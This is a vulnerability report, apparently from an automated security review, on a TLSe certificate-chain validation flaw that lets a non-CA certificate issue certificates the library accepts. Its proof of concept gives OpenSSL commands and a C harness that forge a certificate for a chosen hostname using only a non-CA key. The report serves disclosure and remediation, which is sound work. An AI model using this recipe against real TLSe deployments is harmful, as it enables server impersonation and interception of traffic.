# Chain validation ignores basicConstraints and keyUsage: a non-CA certificate can issue certificates that TLSe reports as verified

**ID:** vuln-0007
**Severity:** HIGH
**Found:** 2026-11-17 10:59:52 UTC
**Target:** TLSe (tlslayer) TLS library, `tlse.c` chain validation
**Endpoint:** tls_certificate_chain_is_valid_root() / tls_default_verify() (TLS peer certificate chain validation)
**CWE:** CWE-295
**CVSS:** 7.4
**Confidence:** High
**Fix Effort:** Medium

## Description

TLSe's chain validation never inspects `basicConstraints` or `keyUsage`. Any certificate whose signature verifies against a chain reaching a loaded trust anchor is accepted as an issuer, including certificates marked `CA:FALSE` and certificates whose key usage excludes `keyCertSign`. A party holding a single trusted end-entity certificate key can therefore mint a certificate for any hostname that TLSe reports as verified, while OpenSSL rejects the same chain.

## Evidence

Locally generated PKI: `root` (CA:TRUE) → `evil` (`CN=not-a-ca.example.com`, `CA:FALSE`, `keyUsage=digitalSignature` only) → `victim` (`CN=victim.example.com`, signed with `evil`'s key).

Same chain, OpenSSL:

```
$ openssl verify -CAfile root.crt -untrusted evil.crt victim.crt
CN=not-a-ca.example.com
error 79 at 1 depth lookup: invalid CA certificate
CN=not-a-ca.example.com
error 32 at 1 depth lookup: key usage does not include certificate signing
error victim.crt: verification failed
exit=2
```

Same chain, TLSe (root loaded as the only trust anchor):

```
$ harness chainroot roots.pem victim.der evil.der
chain_is_valid=0
roots_loaded=1
chain_is_valid_root=0          <- accepted
default_verify=255             <- no_error, accepted
```

A legitimate chain through a real intermediate is still accepted (`chain_is_valid_root=0`), so the two outcomes are not a general "accept everything" failure.

The `evil` certificate's own extensions:

```
X509v3 Basic Constraints: critical
    CA:FALSE
X509v3 Key Usage: critical
    Digital Signature
```

## Impact

The bar for impersonating an arbitrary server becomes possession of any single trusted end-entity key instead of a CA key. That converts a leaked, stolen or mis-issued leaf certificate into a universal impersonation capability against TLSe-based clients and servers, and it defeats the purpose of distinguishing CA certificates from leaf certificates in a PKI. It also means subordinate certificates issued with a restricted name scope or `pathLenConstraint` can be used to mint certificates outside that scope.

## Counterevidence

Looked for an enforcement point elsewhere: `tls_certificate_chain_is_valid_root()` is the only chain decision on the documented path, and it is called directly by `tls_default_verify()` (tlse.c:13536); the only additional checks are a minimum RSA/EC key size on `certificates[0]`, per-certificate expiry, issuer-name matching and signature verification. `struct TLSCertificate` (tlse.c:1602-1637) has no field for basicConstraints, the CA bit, pathLen or keyUsage, and `_private_asn1_parse()` never records them, so no later code can compensate. Parsing the extensions to build such a field is not a bypass: an extension the parser ignores is indistinguishable from one it has not seen, and the same ignore-everything behaviour applies to the tested chain. The differential control above shows a standards-compliant validator rejects exactly the input TLSe accepts, so this is not a difference in X.509 interpretation. The genuine limitation is the attacker's need for a trusted non-CA key, which is why this is rated High rather than Critical.

## What Would Change This Severity

Evidence that a realistic deployment exposes any trusted end-entity private key to an attacker — or that a CA in the bundled trust store issues subordinate certificates without the CA bit — would raise this to critical, because impersonation would then need no key compromise at all; conversely, if every intended use of the library passes a custom callback that performs its own extension checks, the practical impact drops to low.

## Technical Analysis

`tls_default_verify()` is the verifier the library installs when an application loads trust anchors through the libssl-compatible wrapper (`SSL_CTX_root_ca()` sets `ssl_data->certificate_verify = tls_default_verify`, tlse.c:14448-14449), so `tls_certificate_chain_is_valid_root()` is the trust decision for the documented path.

That function walks the supplied chain breadth-first. For each certificate it checks expiry, then looks for an issuer among the loaded roots and among the remaining chain members, and accepts as soon as one signature verifies:

```c title=tlse.c startLineNumber=11282 endLineNumber=11302
        for (rootindex = 0; rootindex < context->root_count; ++rootindex) {
            issuer = context->root_certificates[rootindex];
            if (!_private_tls_certificate_issuer_matches(certificate, issuer) || tls_certificate_is_valid(issuer))
                continue;
            if (_private_tls_certificate_verify_signature(certificate, issuer, 1)) {
                result = 0;
                break;
            }
        }
        if (!result)
            break;
        for (candidate = 1; candidate < len; ++candidate) {
            if (visited[candidate])
                continue;
            issuer = certificates[candidate];
            if (_private_tls_certificate_issuer_matches(certificate, issuer) &&
                _private_tls_certificate_verify_signature(certificate, issuer, 1)) {
                visited[candidate] = 1;
                pending[count++] = candidate;
            }
        }
```

The only additional constraint is `_private_tls_certificate_public_key_is_safe()` applied to `certificates[0]`, which enforces a 2048-bit RSA / 224-bit EC minimum. Nothing consults `basicConstraints`, `pathLenConstraint` or `keyUsage`, and there is no field in the certificate model to consult:

```c title=tlse.c startLineNumber=1602 endLineNumber=1637
struct TLSCertificate {
    unsigned short version;
    unsigned int algorithm;
    unsigned int key_algorithm;
    unsigned int ec_algorithm;
    unsigned char *exponent;
    unsigned int exponent_len;
    unsigned char *pk;
    unsigned int pk_len;
    ...
    unsigned char *fingerprint;
    unsigned char *der_bytes;
    unsigned int der_len;
    unsigned char *bytes;
    unsigned int len;
};
```

`_private_asn1_parse()` records subject, issuer, serial, validity dates and SANs but no extension content, so a certificate's `CA` bit and `keyCertSign` usage are simply not available to any caller. Consequently a certificate that is explicitly marked as not being a CA, and explicitly forbidden from signing certificates, is accepted as an intermediate issuer. The same applies to `pathLenConstraint`: a subordinate CA restricted to zero further subordinates can issue further CAs, and every certificate in the chain — including the leaf — may act as an issuer.

## Proof of Concept

1. Generate a root CA (`CA:TRUE`), and a non-CA certificate `evil` signed by it whose `basicConstraints` is `critical,CA:FALSE` and whose `keyUsage` is `critical,digitalSignature` (no `keyCertSign`).
2. Using only `evil`'s private key, sign a target certificate `victim` for `CN=victim.example.com` with `basicConstraints=CA:FALSE`.
3. Load `root` as the only trust anchor into a TLS context and call `tls_certificate_chain_is_valid_root()` (or `tls_default_verify()`, which `SSL_CTX_root_ca()` installs) on the chain `[victim, evil]`.
4. Observe `chain_is_valid_root = 0` and `default_verify = no_error`: the chain is accepted even though `evil` is not a CA and may not sign certificates.
5. Compare with `openssl verify`, which rejects the identical chain with `error 79: invalid CA certificate` and `error 32: key usage does not include certificate signing`.

````bash
# PKI setup (all local, no network)
openssl req -x509 -newkey rsa:2048 -nodes -keyout root.key -out root.crt -days 3650 \
  -subj "/CN=Test Root CA" -addext "basicConstraints=critical,CA:TRUE"
openssl req -newkey rsa:2048 -nodes -keyout evil.key -out evil.csr -subj "/CN=not-a-ca.example.com"
printf "basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature\n" > evil.ext
openssl x509 -req -in evil.csr -CA root.crt -CAkey root.key -CAcreateserial \
  -out evil.crt -days 365 -extfile evil.ext
openssl req -newkey rsa:2048 -nodes -keyout victim.key -out victim.csr -subj "/CN=victim.example.com"
printf "basicConstraints=critical,CA:FALSE\nsubjectAltName=DNS:victim.example.com\n" > victim.ext
# the victim certificate is signed by a NON-CA key
openssl x509 -req -in victim.csr -CA evil.crt -CAkey evil.key -CAcreateserial \
  -out victim.crt -days 365 -extfile victim.ext

# differential control: a compliant validator rejects the chain
openssl verify -CAfile root.crt -untrusted evil.crt victim.crt   # exit 2, error 79 / error 32

# TLSe accepts it
openssl x509 -in evil.crt -outform DER -out evil.der
openssl x509 -in victim.crt -outform DER -out victim.der
./harness chainroot root.crt victim.der evil.der
# chain_is_valid=0
# roots_loaded=1
# chain_is_valid_root=0
# default_verify=255
```

`harness` is a small driver over the public API:

```c
/* chainroot <roots.pem> <der>... */
ctx = tls_create_context(0, TLS_V12);
tls_load_root_certificates(ctx, roots_pem, roots_len);
printf("chain_is_valid_root=%d\n", tls_certificate_chain_is_valid_root(ctx, chain, n));
printf("default_verify=%d\n", tls_default_verify(ctx, chain, n));
````

## Code Analysis

**Location 1:** `tlse.c` (lines 11286-11289)
  The accept decision: result = 0 is set from signature verification alone, with no check on the issuer's basicConstraints/pathLen/keyUsage
  ```
              if (_private_tls_certificate_verify_signature(certificate, issuer, 1)) {
                  result = 0;
                  break;
              }
  ```

**Location 2:** `tlse.c` (lines 1602-1637)
  The certificate model has no CA bit, pathLen or keyUsage field, and the parser never records those extensions
  ```
  struct TLSCertificate {
      unsigned short version;
      unsigned int algorithm;
      unsigned int key_algorithm;
      unsigned int ec_algorithm;
  ```

## Remediation

Parse and record the `basicConstraints` extension (OID 2.5.29.19) — the CA boolean and, when present, `pathLenConstraint` — and the `keyUsage` extension (OID 2.5.29.15) `keyCertSign` bit, on every certificate the parser accepts. In the chain walker, require `CA == TRUE` and `keyCertSign` for every certificate used as an issuer of another certificate, and carry a path-length counter that is initialised from the first CA's `pathLenConstraint` and decremented for each intermediate; reject the chain when it is exhausted. Treat a certificate that lacks `basicConstraints` as a non-CA (the default per RFC 5280). Apply the same rule to certificates taken from the supplied chain and to the loaded trust anchors, or document explicitly that anchors are trusted unconditionally.

## Fix Verification

No `fix_after` is attached to this finding, deliberately. The complete fix is not a local edit: it requires a new certificate-model field, a new extension parser for `basicConstraints` and `keyUsage` inside `_private_asn1_parse()`, and new logic in `tls_certificate_chain_is_valid_root()`, with a decision about whether loaded trust anchors are exempt. That change cannot be verified as a suggestion block against a single checkpoint, and a partial patch (checking the CA bit only where a field happens to exist, or checking only the first intermediate) would leave the path-length and keyUsage bypasses open, which the fix-verification rules forbid. The concrete change required is spelled out in the remediation steps and the PR body so it can be implemented and reviewed as a normal change.

Verified in this run, for the parts that can be verified: the acceptance behaviour is reproducible on the unmodified tree (`chain_is_valid_root=0`, `default_verify=255` for `[victim, evil]` with only `root` loaded), the same input is rejected by a compliant validator (OpenSSL: error 79 and error 32), and the legitimate chain still validates, so the finding is a real difference in enforcement rather than a harness artefact.

## Assumptions

The attacker must hold a certificate, issued by a CA in the victim's trust store, that is *not* a CA and does not carry the keyCertSign key usage — for example a leaked or stolen end-entity (server or client) certificate and its private key, a subordinate certificate issued under an over-broad policy, or an internal cert whose CA flag is FALSE. Certificate *signing* itself needs only that key, no access to the victim. The victim must use `tls_default_verify()` (installed automatically by `SSL_CTX_root_ca()`) or any callback that delegates to `tls_certificate_chain_is_valid_root()`; the hostname check in `tls_default_verify()` is satisfied by putting the victim's hostname in the forged certificate's SAN.
